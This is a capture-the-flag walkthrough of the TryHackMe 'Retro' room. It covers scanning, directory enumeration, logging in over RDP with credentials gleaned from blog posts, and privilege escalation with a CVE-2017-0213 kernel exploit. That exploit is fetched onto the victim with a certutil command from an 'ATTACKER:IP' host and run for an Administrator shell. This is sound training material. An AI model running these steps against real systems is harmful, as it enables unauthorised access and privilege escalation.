# Retro

Link: [Retro](https://tryhackme.com/room/retro)

## High-Level Overview

New high score!

## Tools Needed

* Nmap
* Gobuster
* xfreerdp

## Walkthrough

After starting the machine, we perform an initial scan using `nmap`:

```bash
$ sudo nmap -p- -Pn -A -vv -T5 MACHINE:IP
```

We can see that the following ports & services are open:

* 80 - http
* 3389 - rdp

Further scanning the open ports & services using `nmap` for known CVEs:

```bash
$ git clone https://github.com/scipag/vulscan
$ sudo nmap -p80,3389 -A --script=vulscan/vulscan.nse MACHINE:IP -Pn -T5 -vv
```

However there doesn't seem to be anything we can easily exploit.

We will continue enumerating using `gobuster` in directory & vhosts mode, since we know there is a web app running:

```bash
$ gobuster dir -u http://MACHINE:IP -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
$ gobuster vhost -u http://MACHINE:IP -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt --exclude-length 335
```

We find an interesting result, there seems to be a page located at `MACHINE:IP/retro`. This is our first flag.

Crawling the website we can see there is an author for those posts `http://MACHINE:IP/retro/index.php/author/wade/`. Maybe he also reuses `wade` as his username for this machine.

Additionally, looking at the post at `http://MACHINE:IP/retro/index.php/2019/12/09/ready-player-one/`, we can see the author mentioning how he always misspells a name when logging in. In the comments we find a reference to what he has trouble typing in when he logs in: `parzival`. This might be another username or maybe a password?

Since we know there is rdp enabled, we can try using those credentials to log in using `xfreerdp`:

```bash
$ xfreerdp /v:MACHINE:IP /u:wade /p:parzival
```

And it seems like these were the correct credentials. Upon successfully logging in, we can see a file `users.txt` on the desktop. This file contains our second flag.

Now that we have access to the system, we need to find a way to escalate our privilege. For this, we can consider a kernel exploit such as `https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213`.

First, we must download the file `CVE-2017-0213_x64.zip`, then unzip it:

```bash
$ unzip CVE-2017-0213_x64.zip
```

To transfer this exploit on the victim machine, we can host a http server on our machine where the file is located using the command:

```bash
$ python3 -m http.server 80
```

On the victim machine, we can download the hosted file by using `certutil`. We will open a `PowerShell` window and type the following command:

```powershell
> certutil.exe -urlcache -f http://ATTACKER:IP:80/CVE-2017-0213_x64.exe exploit.exe
```

We can simply run the `exploit.exe` file that was downloaded on the machine. It will spawn a new `cmd` window with Administrator privileges. We can use this window to get our final flag, which is located at `C:\Users\Administrator\Desktop\root.txt.txt`